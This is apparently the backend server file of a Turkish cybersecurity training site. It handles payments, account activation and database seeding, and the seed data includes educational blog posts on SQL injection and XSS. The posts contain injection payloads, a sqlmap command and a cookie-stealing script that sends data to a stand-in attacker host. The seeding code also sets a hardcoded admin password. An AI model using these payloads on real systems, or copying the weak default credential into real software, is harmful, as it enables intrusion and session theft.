          <table width="100%" cellpadding="0" cellspacing="0">
            <tr>
              <td style="font-size:10px;color:#d1d5db;font-family:monospace;">Başlangıç</td>
              <td align="center" style="font-size:10px;color:#d1d5db;font-family:monospace;">Orta</td>
              <td align="right" style="font-size:10px;color:#d1d5db;font-family:monospace;">İleri</td>
            </tr>
          </table>
        </td></tr>

        <!-- Müfredat -->
        <tr><td style="background:#ffffff;padding:28px 40px;border-bottom:1px solid #f3f4f6;">
          <p style="color:#111827;font-size:13px;font-weight:700;margin:0 0 4px;text-transform:uppercase;letter-spacing:.08em;">Önerilen Müfredat</p>
          <p style="color:#9ca3af;font-size:12px;margin:0 0 16px;">Tahmini süre: <strong style="color:#374151;">${duration}</strong></p>
          <table width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #f3f4f6;border-radius:10px;overflow:hidden;">
            ${phaseRowsHtml}
          </table>
        </td></tr>

        <!-- Outcomes -->
        <tr><td style="background:#f9fafb;padding:28px 40px;border-bottom:1px solid #f3f4f6;">
          <p style="color:#111827;font-size:13px;font-weight:700;margin:0 0 16px;text-transform:uppercase;letter-spacing:.08em;">Program sonunda yapabileceklerin</p>
          <table width="100%" cellpadding="0" cellspacing="0">
            ${outcomeRowsHtml}
          </table>
        </td></tr>

        <!-- CTA -->
        <tr><td style="background:#ffffff;padding:32px 40px;text-align:center;border-bottom:1px solid #f3f4f6;">
          <p style="color:#374151;font-size:14px;margin:0 0 20px;line-height:1.6;">Bu müfredatla birebir eğitim almak ister misin?</p>
          <a href="${SITE_URL}/pricing" style="display:inline-block;background:#059669;color:#ffffff;font-weight:700;font-size:14px;padding:14px 36px;border-radius:10px;text-decoration:none;">Eğitim Programını İncele →</a>
        </td></tr>

        <!-- Footer -->
        <tr><td style="background:#0a1a10;border-radius:0 0 16px 16px;padding:20px 40px;text-align:center;">
          <p style="color:#4b7a60;font-size:11px;margin:0;">© 2026 Siber Kampüs Akademi &nbsp;·&nbsp; <a href="${SITE_URL}" style="color:#00e57a;text-decoration:none;">siberkampus.org</a></p>
        </td></tr>

      </table>
    </td></tr>
  </table>
  </body></html>`;

  try {
    await sendBrevoEmail(email, null, 'Siber Kampüs — Seviye Testi Sonucun', html);
    res.json({ ok: true });
  } catch (err) {
    console.error('Level test mail hatası:', err);
    res.status(500).json({ error: 'E-posta gönderilemedi.' });
  }
});

// POST /api/checkout/start — Ödeme başlat, PayTR iframe token al
app.post('/api/checkout/start', async (req, res) => {
  const { email, name, phone, address, plan_id } = req.body;
  if (!email || !name || !plan_id) return res.status(400).json({ error: 'E-posta, ad soyad ve plan zorunludur.' });

  const plan = PLANS[plan_id];
  if (!plan) return res.status(400).json({ error: 'Geçersiz eğitim paketi.' });

  try {
    // PayTR bilgileri yoksa demo mod
    if (!PAYTR_MERCHANT_ID || !PAYTR_MERCHANT_KEY || !PAYTR_MERCHANT_SALT) {
      const merchant_oid = 'SK' + Date.now() + crypto.randomBytes(4).toString('hex');
      try {
        await pool.query(
          'INSERT INTO orders (email, name, phone, plan_id, plan_name, amount, paytr_merchant_oid, status) VALUES ($1, $2, $3, $4, $5, $6, $7, $8)',
          [email.toLowerCase().trim(), name.trim(), (phone || '').trim(), plan_id, plan.name, plan.price, merchant_oid, 'pending']
        );
      } catch (dbErr) {
        console.warn('Demo mod: orders tablosu bulunamadı, devam ediliyor.', dbErr.message);
      }
      return res.json({ status: 'success', token: 'DEMO_MODE', merchant_oid, demo: true });
    }

    const merchant_oid = 'SK' + Date.now() + crypto.randomBytes(4).toString('hex');
    const user_ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1').split(',')[0].trim();
    const payment_amount = String(plan.price);
    const user_basket = Buffer.from(JSON.stringify([[plan.name, (plan.price / 100).toFixed(2), 1]])).toString('base64');
    const no_installment = '1';
    const max_installment = '0';
    const currency = 'TL';
    const test_mode = process.env.PAYTR_TEST_MODE === '1' ? '1' : '0';
    const merchant_ok_url = SITE_URL + '/pricing?payment=success';
    const merchant_fail_url = SITE_URL + '/pricing?payment=fail';

    // PayTR hash string — dokümantasyondaki sıraya uygun
    const hashStr = PAYTR_MERCHANT_ID + user_ip + merchant_oid + email.toLowerCase().trim() + payment_amount + user_basket + no_installment + max_installment + currency + test_mode;
    const paytr_token = crypto.createHmac('sha256', PAYTR_MERCHANT_KEY).update(hashStr + PAYTR_MERCHANT_SALT).digest('base64');

    // orders tablosuna pending kayıt
    try {
      await pool.query(
        'INSERT INTO orders (email, name, phone, plan_id, plan_name, amount, paytr_merchant_oid, status) VALUES ($1, $2, $3, $4, $5, $6, $7, $8)',
        [email.toLowerCase().trim(), name.trim(), (phone || '').trim(), plan_id, plan.name, plan.price, merchant_oid, 'pending']
      );
    } catch (dbErr) {
      console.warn('Orders tablosuna kayıt hatası (devam ediliyor):', dbErr.message);
    }

    // Telefon: frontend'den "5XXXXXXXXX" (10 hane) geliyor, başına 0 ekle → "05XXXXXXXXX"
    let cleanPhone = (phone || '').replace(/\D/g, '');
    if (cleanPhone.length === 10 && cleanPhone.startsWith('5')) cleanPhone = '0' + cleanPhone;
    if (cleanPhone.length !== 11) cleanPhone = '05000000000';

    const userAddress = (address || '').trim() || 'Türkiye';

    // PayTR iframe token isteği
    const params = new URLSearchParams({
      merchant_id: PAYTR_MERCHANT_ID,
      user_ip,
      merchant_oid,
      email: email.toLowerCase().trim(),
      payment_amount,
      paytr_token,
      user_basket,
      debug_on: '1',
      no_installment,
      max_installment,
      user_name: name.trim(),
      user_address: userAddress,
      user_phone: cleanPhone,
      merchant_ok_url,
      merchant_fail_url,
      timeout_limit: '30',
      currency,
      test_mode,
      lang: 'tr'
    });

    console.log('=== PayTR TOKEN REQUEST ===');
    console.log('merchant_id:', PAYTR_MERCHANT_ID);
    console.log('merchant_oid:', merchant_oid);
    console.log('email:', email.toLowerCase().trim());
    console.log('payment_amount:', payment_amount);
    console.log('user_phone:', cleanPhone);
    console.log('user_address:', userAddress);
    console.log('user_name:', name.trim());
    console.log('test_mode:', test_mode);
    console.log('user_ip:', user_ip);
    console.log('user_basket:', user_basket);
    console.log('hashStr (first 60):', hashStr.slice(0, 60));

    const paytrRes = await fetch('https://www.paytr.com/odeme/api/get-token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: params.toString()
    });
    const paytrData = await paytrRes.json();

    console.log('=== PayTR RESPONSE ===', JSON.stringify(paytrData));

    if (paytrData.status === 'success') {
      res.json({ status: 'success', token: paytrData.token, merchant_oid });
    } else {
      console.error('=== PayTR HATA ===', JSON.stringify(paytrData));
      res.status(500).json({
        error: 'Ödeme altyapısı başlatılamadı.',
        reason: paytrData.reason || paytrData.err_msg || paytrData.err_code || JSON.stringify(paytrData)
      });
    }
  } catch (err) {
    console.error('Checkout start hatası:', err);
    res.status(500).json({ error: 'Ödeme başlatılırken bir hata oluştu.', reason: err.message });
  }
});

// POST /api/checkout/demo-complete — Demo modda ödeme simülasyonu
app.post('/api/checkout/demo-complete', async (req, res) => {
  if (PAYTR_MERCHANT_ID && PAYTR_MERCHANT_KEY && PAYTR_MERCHANT_SALT) {
    return res.status(400).json({ error: 'Demo mod aktif değil.' });
  }

  const { merchant_oid } = req.body;
  if (!merchant_oid) return res.status(400).json({ error: 'Sipariş numarası zorunludur.' });

  try {
    const orderResult = await pool.query('SELECT * FROM orders WHERE paytr_merchant_oid = $1', [merchant_oid]);
    if (orderResult.rows.length === 0) return res.status(404).json({ error: 'Sipariş bulunamadı.' });
    const order = orderResult.rows[0];

    if (order.status === 'paid') return res.json({ status: 'already_paid' });

    // Sipariş durumunu güncelle
    await pool.query('UPDATE orders SET status = $1, paid_at = NOW() WHERE paytr_merchant_oid = $2', ['paid', merchant_oid]);

    // Kullanıcıyı bul veya oluştur
    let userId;
    const existingUser = await pool.query('SELECT id, password_hash FROM users WHERE email = $1', [order.email]);

    if (existingUser.rows.length > 0) {
      userId = existingUser.rows[0].id;
      const plan = PLANS[order.plan_id];
      await pool.query(
        'UPDATE users SET is_premium = true, is_vip = true, subscription = $1, phone = COALESCE(NULLIF($2,\'\'), phone) WHERE id = $3',
        [plan ? plan.subscription : order.plan_id, order.phone || '', userId]
      );
      await pool.query('UPDATE orders SET user_id = $1 WHERE id = $2', [userId, order.id]);

      if (existingUser.rows[0].password_hash && existingUser.rows[0].password_hash !== 'PENDING_SET') {
        return res.json({ status: 'success', message: 'Eğitim aktifleştirildi.' });
      }
    } else {
      const plan = PLANS[order.plan_id];
      const newUser = await pool.query(
        'INSERT INTO users (email, password_hash, name, phone, is_premium, is_vip, subscription) VALUES ($1, $2, $3, $4, true, true, $5) RETURNING id',
        [order.email, 'PENDING_SET', order.name || 'Yeni Kullanıcı', order.phone || '', plan ? plan.subscription : order.plan_id]
      );
      userId = newUser.rows[0].id;
      await pool.query('UPDATE orders SET user_id = $1 WHERE id = $2', [userId, order.id]);
    }

    // Şifre belirleme token'ı oluştur
    const passwordToken = crypto.randomBytes(32).toString('hex');
    const expires = new Date(Date.now() + 72 * 60 * 60 * 1000);
    await pool.query(
      'UPDATE users SET password_set_token = $1, password_set_expires = $2 WHERE id = $3',
      [passwordToken, expires, userId]
    );

    // Şifre belirleme e-postası gönder
    const setPasswordLink = `${SITE_URL}/set-password?token=${passwordToken}`;
    await sendBrevoEmail(
      order.email, order.name,
      'Siber Kampüs Akademi — Şifrenizi Belirleyin',
      buildPasswordSetEmail(order.name || 'Kullanıcı', setPasswordLink)
    );

    res.json({ status: 'success', message: 'Ödeme simüle edildi, e-posta gönderildi.' });
  } catch (err) {
    console.error('Demo complete hatası:', err);
    res.status(500).json({ error: 'Demo ödeme işlenirken hata oluştu.' });
  }
});

// POST /api/checkout/callback — PayTR callback (sunucu-sunucu)
app.post('/api/checkout/callback', async (req, res) => {
  try {
    const { merchant_oid, status, total_amount, hash } = req.body;

    // PayTR hash doğrulama
    const hashStr = merchant_oid + PAYTR_MERCHANT_SALT + status + total_amount;
    const expectedHash = crypto.createHmac('sha256', PAYTR_MERCHANT_KEY).update(hashStr).digest('base64');
    if (hash !== expectedHash) {
      console.error('PayTR callback hash doğrulama başarısız!');
      return res.send('OK'); // PayTR her zaman OK bekler
    }

    // Sipariş kaydını bul
    const orderResult = await pool.query('SELECT * FROM orders WHERE paytr_merchant_oid = $1', [merchant_oid]);
    if (orderResult.rows.length === 0) {
      console.error('Sipariş bulunamadı:', merchant_oid);
      return res.send('OK');
    }
    const order = orderResult.rows[0];

    if (status === 'success') {
      // Sipariş durumunu güncelle
      await pool.query('UPDATE orders SET status = $1, paid_at = NOW() WHERE paytr_merchant_oid = $2', ['paid', merchant_oid]);

      // Kullanıcıyı bul veya oluştur
      let userId;
      const existingUser = await pool.query('SELECT id, password_hash FROM users WHERE email = $1', [order.email]);

      if (existingUser.rows.length > 0) {
        // Mevcut kullanıcı — statüs + telefon güncelle
        userId = existingUser.rows[0].id;
        const plan = PLANS[order.plan_id];
        await pool.query(
          'UPDATE users SET is_premium = true, is_vip = true, subscription = $1, phone = COALESCE(NULLIF($2,\'\'), phone) WHERE id = $3',
          [plan ? plan.subscription : order.plan_id, order.phone || '', userId]
        );
        await pool.query('UPDATE orders SET user_id = $1 WHERE id = $2', [userId, order.id]);

        // Şifresi zaten varsa sadece bilgilendirme e-postası gönder
        if (existingUser.rows[0].password_hash && existingUser.rows[0].password_hash !== 'PENDING_SET') {
          await sendBrevoEmail(
            order.email, order.name,
            'Siber Kampüs Akademi — Eğitiminiz Aktifleştirildi! 🎉',
            `<div style="font-family:system-ui,sans-serif;max-width:560px;margin:0 auto;background:#020806;color:#cdeede;padding:40px 32px;border-radius:16px;border:1px solid #103a26;">
              <div style="text-align:center;margin-bottom:32px;">
                <span style="display:inline-block;width:40px;height:40px;border:2px solid #00ff88;border-radius:10px;line-height:40px;font-size:18px;color:#00ff88;font-family:monospace;font-weight:bold;">&gt;_</span>
                <span style="font-size:20px;font-weight:700;color:#eafff5;margin-left:12px;vertical-align:middle;">Siber Kampüs <span style="color:#00ff88;">Akademi</span></span>
              </div>
              <h1 style="font-size:24px;color:#eafff5;margin:0 0 16px;text-align:center;">Ödemeniz Alındı! 🎉</h1>
              <p style="color:#9fc4b5;font-size:15px;line-height:1.7;text-align:center;">${order.name}, <strong>${order.plan_name}</strong> eğitim paketiniz başarıyla aktifleştirildi.</p>
              <div style="text-align:center;margin:32px 0;">
                <a href="${SITE_URL}" style="display:inline-block;background:#00ff88;color:#021008;font-weight:700;font-size:15px;padding:14px 36px;border-radius:10px;text-decoration:none;">Eğitime Başla →</a>
              </div>
              <hr style="border:none;border-top:1px solid #103a26;margin:32px 0;" />
              <p style="color:#5c8a74;font-size:11px;text-align:center;">© 2026 Siber Kampüs Akademi</p>
            </div>`
          );
          return res.send('OK');
        }
      } else {
        // Yeni kullanıcı oluştur (şifresiz)
        const plan = PLANS[order.plan_id];
        const newUser = await pool.query(
          'INSERT INTO users (email, password_hash, name, phone, is_premium, is_vip, subscription) VALUES ($1, $2, $3, $4, true, true, $5) RETURNING id',
          [order.email, 'PENDING_SET', order.name || 'Yeni Kullanıcı', order.phone || '', plan ? plan.subscription : order.plan_id]
        );
        userId = newUser.rows[0].id;
        await pool.query('UPDATE orders SET user_id = $1 WHERE id = $2', [userId, order.id]);
      }

      // Şifre belirleme token'ı oluştur
      const passwordToken = crypto.randomBytes(32).toString('hex');
      const expires = new Date(Date.now() + 72 * 60 * 60 * 1000); // 72 saat
      await pool.query(
        'UPDATE users SET password_set_token = $1, password_set_expires = $2 WHERE id = $3',
        [passwordToken, expires, userId]
      );

      // Şifre belirleme e-postası gönder
      const setPasswordLink = `${SITE_URL}/set-password?token=${passwordToken}`;
      await sendBrevoEmail(
        order.email, order.name,
        'Siber Kampüs Akademi — Şifrenizi Belirleyin',
        buildPasswordSetEmail(order.name || 'Kullanıcı', setPasswordLink)
      );

    } else {
      // Ödeme başarısız
      await pool.query('UPDATE orders SET status = $1 WHERE paytr_merchant_oid = $2', ['failed', merchant_oid]);
    }

    res.send('OK');
  } catch (err) {
    console.error('Checkout callback hatası:', err);
    res.send('OK'); // PayTR her zaman OK bekler
  }
});

// POST /api/auth/set-password — Şifre belirleme (ödeme sonrası)
app.post('/api/auth/set-password', async (req, res) => {
  const { token, password } = req.body;
  if (!token || !password) return res.status(400).json({ error: 'Token ve şifre zorunludur.' });
  if (password.length < 6) return res.status(400).json({ error: 'Şifre en az 6 karakter olmalıdır.' });

  try {
    const result = await pool.query(
      'SELECT id, email, name FROM users WHERE password_set_token = $1 AND password_set_expires > NOW()',
      [token]
    );
    if (result.rows.length === 0) {
      return res.status(400).json({ error: 'Geçersiz veya süresi dolmuş bağlantı. Lütfen destek ile iletişime geçin.' });
    }

    const user = result.rows[0];
    const passwordHash = await bcrypt.hash(password, 10);

    await pool.query(
      'UPDATE users SET password_hash = $1, password_set_token = NULL, password_set_expires = NULL WHERE id = $2',
      [passwordHash, user.id]
    );

    // Direkt giriş yapması için JWT token üret
    const payload = await getUserPayload(user.id);
    const jwtToken = jwt.sign({ id: payload.id, email: payload.email }, JWT_SECRET, { expiresIn: '7d' });

    res.json({ token: jwtToken, user: payload });
  } catch (err) {
    console.error('Set password hatası:', err);
    res.status(500).json({ error: 'Şifre belirlenirken bir hata oluştu.' });
  }
});

// GET /api/checkout/status/:oid — Ödeme durumu sorgula
app.get('/api/checkout/status/:oid', async (req, res) => {
  try {
    const result = await pool.query('SELECT status, plan_id, plan_name, amount, paid_at FROM orders WHERE paytr_merchant_oid = $1', [req.params.oid]);
    if (result.rows.length === 0) return res.status(404).json({ error: 'Sipariş bulunamadı.' });
    res.json(result.rows[0]);
  } catch (err) {
    res.status(500).json({ error: 'Durum sorgulanırken hata oluştu.' });
  }
});

// ==========================================
// SPA ROUTING FALLBACK
// ==========================================
app.get(/^(?!\/api).+/, (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// ==========================================
// INIT DATABASE AND SEED DATA
// ==========================================
async function initDatabase() {
  try {
    console.log('⏳ Veritabanı şeması doğrulanıyor...');
    const schemaSql = fs.readFileSync(path.join(__dirname, 'db_schema.sql'), 'utf8');
    await pool.query(schemaSql);
    await pool.query('ALTER TABLE users ADD COLUMN IF NOT EXISTS is_vip BOOLEAN DEFAULT FALSE');
    await pool.query('ALTER TABLE users ADD COLUMN IF NOT EXISTS is_premium BOOLEAN DEFAULT FALSE');
    await pool.query('ALTER TABLE chat_messages ADD COLUMN IF NOT EXISTS is_vip BOOLEAN DEFAULT FALSE');
    await pool.query('ALTER TABLE blogs ADD COLUMN IF NOT EXISTS seo_title VARCHAR(255)');
    await pool.query('ALTER TABLE blogs ADD COLUMN IF NOT EXISTS meta_description TEXT');
    await pool.query('ALTER TABLE blogs ADD COLUMN IF NOT EXISTS focus_keywords VARCHAR(255)');
    await pool.query('ALTER TABLE blogs ADD COLUMN IF NOT EXISTS canonical_url VARCHAR(255)');
    console.log('✓ Veritabanı şeması hazır.');

    // Check if we need to seed data
    // Check if mentor exists
    const mentorCheck = await pool.query('SELECT id FROM users WHERE email = $1', ['mentor@siberkampus.com']);
    if (mentorCheck.rows.length === 0) {
      console.log('🌱 Admin kullanıcısı ekleniyor...');
      const mentorPwHash = await bcrypt.hash('mentor123', 10);
      await pool.query(`
        INSERT INTO users (email, password_hash, name, points, solved_count, level, is_admin) VALUES 
        ('mentor@siberkampus.com', $1, 'Siber Mentör', 0, 0, 1, true)
      `, [mentorPwHash]);
      console.log('✓ Admin kullanıcısı başarıyla eklendi.');
    }

    // Check if demo user exists
    const demoCheck = await pool.query('SELECT id FROM users WHERE email = $1', ['demo@siberkampus.com']);
    if (demoCheck.rows.length === 0) {
      console.log('🌱 Demo kullanıcısı ekleniyor...');
      const demoPwHash = await bcrypt.hash('demo123456', 10);
      const demoUserRes = await pool.query(`
        INSERT INTO users (email, password_hash, name, points, solved_count, level, streak, badges, rank_val) VALUES 
        ('demo@siberkampus.com', $1, 'Demo Kullanıcı', 350, 6, 5, 30, 5, 250)
        RETURNING id
      `, [demoPwHash]);
      const demoUserId = demoUserRes.rows[0].id;

      // Seed solved rooms for demo user
      await pool.query(`
        INSERT INTO solved_rooms (user_id, room_id, points_earned) VALUES
        ($1, 'web-01', 50),
        ($1, 'web-02', 60),
        ($1, 'web-04', 50),
        ($1, 'web-11', 50),
        ($1, 'web-13', 50),
        ($1, 'net-01', 60)
        ON CONFLICT DO NOTHING
      `, [demoUserId]);

      // Seed progress for demo user
      await pool.query(`
        INSERT INTO room_progress (user_id, room_id, progress_percent) VALUES
        ($1, 'web-01', 100),
        ($1, 'web-02', 100),
        ($1, 'web-04', 100),
        ($1, 'web-11', 100),
        ($1, 'web-13', 100),
        ($1, 'net-01', 100)
        ON CONFLICT DO NOTHING
      `, [demoUserId]);

      console.log('✓ Demo kullanıcısı ve ilerlemesi başarıyla eklendi.');
    }

    // Seed or update default blogs (upsert by slug)
    {
      console.log('🌱 Blog yazıları kontrol ediliyor / güncelleniyor...');
      const defaultBlogs = [
        {
          title: 'SQL Injection Nedir? Temelden İleri Seviyeye Kapsamlı Rehber (2025)',
          slug: 'sql-injection-nedir-kapsamli-rehber',
          excerpt: 'SQL Injection (SQLi) saldırılarını sıfırdan ileri seviyeye kadar öğrenin. UNION, Blind, Error-based ve Time-based SQLi türlerini gerçek örneklerle keşfedin.',
          category: 'Web Güvenliği',
          author: 'Ahmet Yılmaz',
          read_time: '18 dk',
          seo_title: 'SQL Injection Nedir? Türleri, Örnekleri ve Korunma Yolları | 2025 Rehber',
          meta_description: 'SQL Injection (SQLi) saldırı türlerini, gerçek dünya örneklerini ve korunma yöntemlerini öğrenin. UNION, Blind, Error-based SQLi teknikleri detaylı anlatım.',
          focus_keywords: 'sql injection, sqli nedir, sql injection türleri, sql injection korunma, sql enjeksiyon',
          content: '<h2>SQL Injection (SQLi) Nedir?</h2><p><strong>SQL Injection</strong>, web uygulamalarındaki en yaygın ve en tehlikeli güvenlik açıklarından biridir. Saldırgan, uygulamanın veritabanı sorgularına kendi SQL kodunu enjekte ederek yetkisiz veri erişimi, veri manipülasyonu ve hatta sunucu kontrolü elde edebilir.</p><p>OWASP Top 10 listesinde yıllardır üst sıralarda yer alan SQLi, 2025 yılında hala kurumsal sistemlerin en büyük tehditleri arasındadır. Bu rehberde SQLi\'nin ne olduğunu, nasıl çalıştığını ve nasıl önlenebileceğini adım adım öğreneceksiniz.</p><h2>SQL Injection Nasıl Çalışır?</h2><p>Bir web uygulaması kullanıcı girdisini doğrudan SQL sorgusuna dahil ettiğinde SQLi zafiyeti oluşur. Örneğin bir giriş formunda:</p><pre><code>SELECT * FROM users WHERE username = \'admin\' AND password = \'12345\'</code></pre><p>Saldırgan, parola alanına <code>\' OR 1=1 -- -</code> yazarsa sorgu şu hale gelir:</p><pre><code>SELECT * FROM users WHERE username = \'admin\' AND password = \'\' OR 1=1 -- -\'</code></pre><p><code>1=1</code> her zaman doğru olduğu için kimlik doğrulama atlanır ve saldırgan admin olarak giriş yapar.</p><h2>SQL Injection Türleri</h2><h3>1. In-Band SQLi (Klasik)</h3><p>Saldırganın sonuçları doğrudan görebildiği en yaygın türdür. İki alt kategorisi vardır:</p><ul><li><strong>Error-Based SQLi:</strong> Veritabanı hata mesajlarından bilgi çıkarma. Örnek: <code>\' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables)) -- -</code></li><li><strong>UNION-Based SQLi:</strong> UNION operatörü ile farklı tablolardan veri çekme. Örnek: <code>\' UNION SELECT username, password FROM users -- -</code></li></ul><h3>2. Blind SQLi</h3><p>Sunucu hata mesajı döndürmediğinde kullanılır:</p><ul><li><strong>Boolean-Based:</strong> TRUE/FALSE yanıtlarına göre karakter karakter veri çıkarma</li><li><strong>Time-Based:</strong> <code>SLEEP()</code> fonksiyonuyla yanıt süresinden bilgi elde etme</li></ul><h3>3. Out-of-Band SQLi</h3><p>DNS veya HTTP istekleri üzerinden veri sızdırma. Nadiren kullanılır ancak güçlü bir tekniktir.</p><h2>Gerçek Dünya SQLi Örnekleri</h2><table><tr><th>Yıl</th><th>Hedef</th><th>Etki</th></tr><tr><td>2023</td><td>MOVEit Transfer</td><td>2.500+ kuruluş etkilendi</td></tr><tr><td>2021</td><td>Accellion FTA</td><td>Hassas dosyalar sızdırıldı</td></tr><tr><td>2019</td><td>Fortnite</td><td>200M+ kullanıcı verisi risk altına girdi</td></tr></table><h2>SQL Injection Araçları</h2><ul><li><strong>sqlmap:</strong> Otomatik SQLi tespit ve sömürü aracı</li><li><strong>Burp Suite:</strong> Web uygulama güvenlik testi platformu</li><li><strong>Havij:</strong> Otomatik veritabanı keşif aracı</li></ul><pre><code># sqlmap kullanım örneği\nsqlmap -u "http://hedef.com/sayfa?id=1" --dbs --batch</code></pre><h2>SQL Injection\'dan Korunma Yöntemleri</h2><h3>1. Parametreli Sorgular (Prepared Statements)</h3><p>En etkili korunma yöntemidir. Kullanıcı girdisi asla SQL koduna dahil edilmez:</p><pre><code>// Node.js örneği\nconst result = await pool.query(\n  \'SELECT * FROM users WHERE id = $1\',\n  [userId]\n);</code></pre><h3>2. ORM Kullanımı</h3><p>Sequelize, Prisma gibi ORM kütüphaneleri SQL sorgularını otomatik olarak parametrize eder.</p><h3>3. Girdi Doğrulama ve Sanitizasyon</h3><p>Kullanıcı girdilerini whitelist yaklaşımıyla doğrulayın. Özel karakterleri (<code>\'</code>, <code>"</code>, <code>;</code>, <code>--</code>) filtreleyin.</p><h3>4. En Az Yetki Prensibi</h3><p>Veritabanı kullanıcısına yalnızca gerekli minimum yetkileri verin. Web uygulaması <code>DROP TABLE</code> yetkisine sahip olmamalıdır.</p><h3>5. WAF (Web Application Firewall)</h3><p>ModSecurity gibi WAF çözümleri bilinen SQLi kalıplarını engelleyebilir, ancak tek başına yeterli değildir.</p><h2>Sonuç</h2><p>SQL Injection, basit bir girdi doğrulama hatasından kaynaklanan ancak yıkıcı sonuçlara yol açabilen kritik bir güvenlik açığıdır. <strong>Parametreli sorgular</strong> kullanarak, girdi doğrulama yaparak ve düzenli güvenlik testleri gerçekleştirerek SQLi saldırılarından korunabilirsiniz.</p><blockquote>siberkampus platformundaki SQL Injection laboratuvarlarında bu teknikleri güvenli bir ortamda uygulayarak deneyim kazanabilirsiniz.</blockquote>'
        },
        {
          title: 'XSS (Cross-Site Scripting) Saldırıları: Türleri, Örnekleri ve Savunma Rehberi',
          slug: 'xss-saldirilari-turleri-ornekleri-savunma',
          excerpt: 'XSS saldırı türlerini (Reflected, Stored, DOM-based), gerçek dünya örneklerini ve etkili savunma stratejilerini kapsamlı şekilde öğrenin.',
          category: 'Web Güvenliği',
          author: 'Selin Öz',
          read_time: '16 dk',
          seo_title: 'XSS Nedir? Reflected, Stored, DOM-Based XSS Türleri ve Korunma | 2025',
          meta_description: 'Cross-Site Scripting (XSS) saldırı türlerini, cookie çalma tekniklerini ve CSP, sanitizasyon gibi savunma yöntemlerini detaylı öğrenin.',
          focus_keywords: 'xss nedir, cross-site scripting, xss türleri, xss korunma, stored xss, reflected xss',
          content: '<h2>XSS (Cross-Site Scripting) Nedir?</h2><p><strong>Cross-Site Scripting (XSS)</strong>, saldırganın zararlı JavaScript kodunu güvenilir bir web sitesine enjekte ederek kurbanın tarayıcısında çalıştırmasına olanak tanıyan bir güvenlik açığıdır. OWASP Top 10\'da sürekli yer alan XSS, web uygulamalarının en yaygın zafiyetlerinden biridir.</p><p>XSS saldırılarıyla oturum çerezleri çalınabilir, kullanıcılar sahte sayfalara yönlendirilebilir, formlar manipüle edilebilir ve hatta tarayıcı üzerinden tam kontrol sağlanabilir.</p><h2>XSS Saldırı Türleri</h2><h3>1. Reflected XSS (Yansıyan)</h3><p>Zararlı kod URL parametresi veya form girdisi üzerinden sunucuya gönderilir ve yanıtta doğrudan yansıtılır. Kalıcı değildir — kurbanın özel hazırlanmış linke tıklaması gerekir.</p><pre><code># Örnek URL\nhttps://site.com/arama?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre><p><strong>Saldırı senaryosu:</strong> Saldırgan, hazırladığı zararlı linki e-posta veya sosyal medya üzerinden kurbana gönderir. Kurban tıkladığında script çalışır.</p><h3>2. Stored XSS (Kalıcı)</h3><p>En tehlikeli XSS türüdür. Zararlı kod veritabanına kaydedilir ve sayfayı ziyaret eden <strong>her kullanıcıda</strong> otomatik çalışır.</p><p><strong>Yaygın hedefler:</strong></p><ul><li>Yorum alanları ve forumlar</li><li>Kullanıcı profil bilgileri</li><li>Mesajlaşma sistemleri</li><li>Ürün değerlendirmeleri</li></ul><pre><code># Yorum alanına yazılan payload\n&lt;script&gt;fetch(\'https://saldirgan.com/log?c=\'+document.cookie)&lt;/script&gt;</code></pre><h3>3. DOM-Based XSS</h3><p>Sunucu tarafında hiçbir değişiklik olmadan, tamamen istemci tarafında JavaScript\'in DOM\'u güvensiz şekilde manipüle etmesiyle oluşur.</p><pre><code>// Güvensiz kod örneği\ndocument.getElementById(\'output\').innerHTML = location.hash.slice(1);\n\n// Saldırı\nhttps://site.com/sayfa#&lt;img src=x onerror=alert(1)&gt;</code></pre><h2>XSS ile Neler Yapılabilir?</h2><ul><li><strong>Oturum çerezi çalma:</strong> <code>document.cookie</code> ile session hijacking</li><li><strong>Keylogger:</strong> Kullanıcının tuş vuruşlarını kaydetme</li><li><strong>Phishing:</strong> Sahte giriş formu gösterme</li><li><strong>Kripto madenciliği:</strong> Kurbanın tarayıcısında madencilik yapma</li><li><strong>Worm yayılımı:</strong> Samy worm (MySpace, 2005) gibi kendi kendini yayan XSS</li></ul><h2>XSS\'den Korunma Yöntemleri</h2><h3>1. Çıktı Kodlama (Output Encoding)</h3><p>Kullanıcı girdisini HTML\'de gösterirken özel karakterleri encode edin:</p><table><tr><th>Karakter</th><th>Encode</th></tr><tr><td>&lt;</td><td>&amp;lt;</td></tr><tr><td>&gt;</td><td>&amp;gt;</td></tr><tr><td>"</td><td>&amp;quot;</td></tr><tr><td>\'</td><td>&amp;#x27;</td></tr></table><h3>2. Content Security Policy (CSP)</h3><p>HTTP başlığı ile hangi kaynakların script çalıştırabileceğini sınırlayın:</p><pre><code>Content-Security-Policy: default-src \'self\'; script-src \'self\' \'nonce-abc123\'</code></pre><h3>3. HttpOnly ve Secure Cookie Flag</h3><p>Çerezlere <code>HttpOnly</code> flag ekleyerek JavaScript erişimini engelleyin:</p><pre><code>Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict</code></pre><h3>4. DOMPurify ile Sanitizasyon</h3><p>Kullanıcı girdisini DOM\'a eklemeden önce temizleyin:</p><pre><code>import DOMPurify from \'dompurify\';\nelement.innerHTML = DOMPurify.sanitize(userInput);</code></pre><h2>Sonuç</h2><p>XSS saldırıları basit görünse de oturum çalma, veri sızdırma ve kullanıcı manipülasyonu gibi ciddi sonuçlara yol açabilir. <strong>Çıktı kodlama, CSP ve HttpOnly çerezler</strong> birlikte uygulandığında XSS\'e karşı güçlü bir savunma oluşturur.</p><blockquote>siberkampus\'taki XSS laboratuvarlarında Reflected ve Stored XSS tekniklerini güvenli ortamda deneyimleyin.</blockquote>'
        },
        {
          title: 'Reverse Shell Nedir? Kurulum, Tespit ve Savunma Rehberi (2025)',
          slug: 'reverse-shell-nedir-kurulum-tespit-savunma',
          excerpt: 'Reverse shell kavramını, popüler payload türlerini, Netcat/Bash/Python/PHP örneklerini ve savunma stratejilerini kapsamlı şekilde öğrenin.',
          category: 'Post-Exploitation',
          author: 'Zeynep Kara',
          read_time: '15 dk',
          seo_title: 'Reverse Shell Nedir? Netcat, Bash, Python Örnekleri ve Tespit Yöntemleri',
